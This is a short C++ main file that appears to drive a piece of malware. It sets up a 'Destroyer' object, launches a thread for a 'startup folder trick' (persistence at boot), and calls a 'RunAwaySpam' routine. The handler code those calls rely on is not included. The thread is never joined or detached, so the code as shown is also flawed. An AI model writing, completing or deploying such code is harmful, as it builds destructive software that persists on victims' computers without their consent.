#include "handler.h"

using namespace std;

int main()
{
    Destroyer dest; //Initializing destroyer
    thread t1(startupexec); //startup folder trick
    dest.RunAwaySpam();
}